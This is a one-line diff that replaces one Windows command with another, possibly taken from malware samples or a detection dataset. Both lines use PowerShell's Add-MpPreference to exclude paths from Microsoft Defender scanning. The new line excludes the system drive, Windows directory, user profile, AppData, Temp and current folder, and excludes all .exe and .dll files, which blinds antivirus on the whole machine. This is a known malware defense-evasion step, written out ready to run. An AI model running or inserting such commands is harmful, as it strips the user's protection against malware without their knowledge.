@@ -1,1 +1,1 @@
-powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%appdata%"
+C:\Windows\System32\cmd.exe cmd /c powershell -Command Add-MpPreference -ExclusionPath @(($pwd).path, $env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & exit
